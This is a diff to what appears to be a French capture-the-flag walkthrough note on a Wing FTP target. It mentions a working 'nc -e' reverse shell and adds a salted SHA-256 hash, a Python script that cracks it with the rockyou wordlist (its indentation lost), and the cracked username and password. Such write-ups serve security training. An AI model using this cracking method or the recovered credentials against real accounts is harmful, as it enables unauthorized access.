@@ -18,3 +18,43 @@ La commande avec nc -e fonctionne car elle ne contient pas de quotes imbriquées
 
 ![[IMG-20260215001500951.png]]
 
+![[IMG-20260215004235214.png]]
+
+![[IMG-20260215004253856.png]]
+
+```
+Salt:WingFTP
+Hash:32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca
+```
+
+crack.py:
+```python
+import hashlib  
+  
+target = "32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca"  
+salt = "WingFTP"  
+  
+def sha256(s):  
+return hashlib.sha256(s.encode()).hexdigest()  
+  
+with open("/opt/lists/rockyou.txt", "rb") as f:  
+for line in f:  
+pw = line.strip().decode(errors="ignore")  
+  
+if sha256(pw + salt) == target:  
+print("[+] FOUND:", pw, "(pw+salt)")  
+break  
+  
+if sha256(salt + pw) == target:  
+print("[+] FOUND:", pw, "(salt+pw)")  
+break
+```
+
+![[IMG-20260215004423130.png]]
+
+```
+wacky:!#7Blushing^*Bride5
+```
+
+![[IMG-20260215004507026.png]]
+
